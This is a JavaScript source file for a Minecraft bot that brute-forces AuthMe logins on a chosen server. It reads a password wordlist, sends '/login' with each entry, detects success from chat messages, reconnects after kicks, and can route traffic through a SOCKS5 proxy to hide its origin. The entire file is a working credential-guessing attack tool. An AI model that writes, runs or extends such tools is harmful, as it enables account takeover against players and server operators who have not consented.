const mccolors = require('minecraft-colors')
const mineflayer = require('mineflayer');
const ProxyAgent = require('proxy-agent');
const socks = require('socks').SocksClient
const proxy = require('proxy-agent');
const fs = require('fs');

const characters = {
  '"black"': '§0',
  '"dark_blue"': '§1',
  '"dark_green"': '§2',
  '"dark_aqua""': '§3',
  '"dark_red"': '§4',
  '"dark_purple"': '§5',
  '"gold"': '§6',
  '"gray"': '§7',
  '"dark_gray"': '§8',
  '"blue"': '§9',
  '"green"': '§a',
  '"aqua"': '§b',
  '"red"': '§c',
  '"light_purple"': '§d',
  '"yellow"': '§e',
  '"white"': '',
  '"text"': '',
  '"clickEvent"': '',
  '"action"': '',
  '"open_url"': '',
  '"value"': '',
  '"strikethrough"': '',
  '"underlined"': '',
  '"obfuscated"': '',
  '"translate"': '',
  '"italic"': '',
  '"color"': '',
  '"extra"': '',
  '"bold"': '',
  '"dark"': '',
  '"text"': '',
  '{': '',
  '}': '',
  '"': '',
  ':': '',
  'false,': '',
  'true,': '',
  ',': '',
  'http//Minecraft.net': '',
};


const host = process.argv[2]
const port = process.argv[3]
const username = process.argv[4]
const protocol = process.argv[5]
const passwordFile = process.argv[6]
const lang = process.argv[7]
const proxyHost = process.argv[8];
const proxyPort = process.argv[9];

let settings_data = fs.readFileSync('settings/bruteforce.json');
let settings_json = JSON.parse(settings_data);
let lang_data = fs.readFileSync(`settings/lang/${lang}.json`);
let lang_json = JSON.parse(lang_data);

const wordsToLogin = settings_json.authme.WORDS_TO_LOGIN
const wordsAtLogin = settings_json.authme.WORDS_AT_LOGIN
const bot_connected = lang_json.commands.authme.BOT_CONNECTED
const bot_expelled = lang_json.commands.authme.BOT_EXPELLED
const testing_password = lang_json.commands.authme.TESTING_PASSWORD
const password_found = lang_json.commands.authme.PASSWORD_FOUND
const password_not_found = lang_json.commands.authme.PASSWORD_NOT_FOUND
const invalidProxy = lang_json.INVALID_PROXY

const fileContent = fs.readFileSync(passwordFile, 'utf8')
const items = fileContent.split('\n');
let passwords = [];
let attempts = 0;

for (word of items) {
  word = word.replace('\r', '')
  passwords.push(word)
}

function replaceWords(str) {
  try {
    for (let key in characters) {
      str = str.replace(new RegExp(key, 'g'), characters[key]);
    }
    
    str = str.replace(/\[/g, '').replace(/\]/g, '').replace(/\\n/g, ''); 
    return str;
  } catch {
    return 'Error'
  }
}

function createBot() {
  if (proxyHost == null) {
    var bot = mineflayer.createBot({
    host: host,
    port: parseInt(port),
    username: username,
    version: protocol,
    hideErrors: true
    });

  } else {
    var bot = mineflayer.createBot({
      connect: bot => {
        socks.createConnection({
          proxy: {
            host: proxyHost,
            port: parseInt(proxyPort),
            type: 5
          },
          command: 'connect',
          destination: {
            host: host,
            port: parseInt(port)
          }
        }, (err, info) => {
          if (err) {
            if (err.toString().includes(`${proxyHost}:${proxyPort}`)) {
              console.log(mccolors.translateColors(`\n    §f[§c#§f] §c${invalidProxy}`))
            } else {
              console.log(err)
            }
            return
          }
          bot.setSocket(info.socket)
          bot.emit('connect')
        })
      },
      agent: new ProxyAgent({ protocol: 'socks5:', host: proxyHost, port: proxyPort }),
      username: username,
      version: protocol,
      hideErrors: true
    })
  }

  bot.on('login', () => {
    console.log(mccolors.translateColors(`\n    §f[§c#§f] §a${bot_connected}`))
  })

  bot.on('messagestr', (msg) => {
    if (attempts == passwords.length) {
      setTimeout(() => {
        console.log(mccolors.translateColors(`\n    §f[§c#§f] §4${password_not_found}`))
        bot.quit()
        process.exit(1);
      }, 1000)
    }

    for (const word of wordsAtLogin) {
      if (msg.includes(word)) {
        console.log(mccolors.translateColors(`\n    §f[§c#§f] §f${password_found}§a${passwords[attempts-1]}`))
        bot.quit()
        process.exit(1);
      }
    }

    for (const word of wordsToLogin) {
      if(msg.includes(word))  {
        bot.chat(`/login ${passwords[attempts]}`)
        console.log(mccolors.translateColors(`\n    §f[§c#§f] §f${testing_password}§a${passwords[attempts]}`))
        attempts += 1;
      }
    }
  })

  bot.on('error', (err) => {
    console.log(mccolors.translateColors(`\n    §f[§c#§f] §c${err}`))
    bot.quit()
    process.exit(1);
  })

  bot.on('kicked', reason => {
    reason = replaceWords(reason)
    console.log(mccolors.translateColors(`\n    §f[§c#§f] §f${bot_expelled}§c${reason}`))
    setTimeout(() => {
        createBot()
      }, settings_json.authme.RECONNECT)
  })
}

createBot()
